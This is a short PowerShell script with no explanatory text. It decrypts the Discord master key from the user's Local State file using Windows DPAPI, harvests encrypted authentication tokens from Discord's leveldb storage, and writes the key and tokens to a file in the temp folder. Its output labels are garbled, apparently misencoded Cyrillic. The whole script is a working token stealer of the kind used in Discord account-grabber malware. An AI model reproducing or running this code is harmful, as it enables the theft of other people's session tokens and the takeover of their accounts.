Add-Type -AssemblyName System.Security
$localStatePath = "$env:APPDATA\discord\Local State"
$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
$encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey[5..($encryptedKey.Length-1)], $null, 'CurrentUser')
$leveldbPath = "$env:APPDATA\discord\Local Storage\leveldb"
$encryptedTokens = @()
$files = Get-ChildItem "$leveldbPath\*.ldb", "$leveldbPath\*.log" -ErrorAction SilentlyContinue
foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllBytes($file.FullName)
    $text = [System.Text.Encoding]::UTF8.GetString($content)
    if ($text -match 'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)') {
        $encryptedTokens += $Matches[1]
    }
}
$output = "Ã¿—“≈–- Àﬁ◊ (hex):`n"
$output += ($masterKey | ForEach-Object { $_.ToString("X2") }) -join ""
$output += "`n`n«¿ÿ»‘–Œ¬¿ÕÕ€≈ “Œ ≈Õ€ (base64):`n"
foreach ($token in ($encryptedTokens | Select-Object -Unique)) {
    $output += $token + "`n"
}
$output | Out-File "$env:TEMP\discord_data.txt" -Encoding UTF8